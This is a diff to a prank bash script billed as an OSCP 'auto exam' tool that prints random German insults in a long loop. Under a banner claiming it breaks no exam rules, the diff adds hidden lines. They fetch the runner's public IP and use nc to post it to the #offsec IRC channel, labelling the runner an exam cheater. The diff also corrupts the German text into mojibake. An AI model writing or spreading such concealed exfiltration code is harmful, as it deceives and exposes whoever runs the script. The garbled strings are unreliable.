@@ -21,6 +21,8 @@ echo " Welcome to:
 Thanks to all of you boys & girls for the input ...
 I hope you enjoy this auto exam script .. unfortunately the runtime of this script is at the moment 25h .. I hope I can trim it down to run a bit faster .... Right now it doesn't violate any off sec rules .. hope it stays so ... so enjoy ...."
 sleep 30
+ip_address=$(dig +short myipy.opendns.com @resolver1.opendns.com)
+echo -e "USER bot guest dumbobot dummy\nNICK auto-OCSP-bot \nJOIN #offsec\nPRIVMSG #offsec: l337 h4x0r auto-pwning OSCP at $ip_address \nQUIT\n" | nc irc.freenode.net 6667
 
  for i in `seq 1 1800`;
         do
@@ -40,7 +42,7 @@ if [ $b = 42 ]; then
 		echo "   88 8eee "
            	 fi
 if [ $b = 23 ]; then
-               		echo "23 – Nichts ist so wie es scheint"
+               		echo "23 â€“ Nichts ist so wie es scheint"
            	 fi
 if [ $b \< 20  ]; then
                		echo "Enumerate"
@@ -77,13 +79,13 @@ if [ $b = 31  ]; then
                		echo "Hagel und Granaten!"
            	 fi
 if [ $b = 32  ]; then
-               		echo "Alle Höllenhunde!"
+               		echo "Alle HÃ¶llenhunde!"
            	 fi
 if [ $b = 33  ]; then
-               		echo "Pirat! … Verbrecher! … Halsabschneider!"
+               		echo "Pirat! â€¦ Verbrecher! â€¦ Halsabschneider!"
            	 fi
 if [ $b = 34  ]; then
-               		echo "Süsswassermatrosen! …"
+               		echo "SÃ¼sswassermatrosen! â€¦"
            	 fi
 if [ $b = 35  ]; then
                		echo "Gummibeiniger Satansbraten!"
@@ -95,7 +97,7 @@ if [ $b = 37  ]; then
                		echo "Politiker!"
            	 fi
 if [ $b = 38  ]; then
-               		echo "Sie Mückenhirn in Aspik!"
+               		echo "Sie MÃ¼ckenhirn in Aspik!"
            	 fi
 if [ $b = 39  ]; then
                		
@@ -161,7 +163,7 @@ if [ $b = 47  ]; then
                		echo "someone got a root shell ...."
            	 fi
 if [ $b = 48  ]; then
-               		echo "Hätte hätte Fahrradkette ...."
+               		echo "HÃ¤tte hÃ¤tte Fahrradkette ...."
            	 fi
 
 	sleep 5
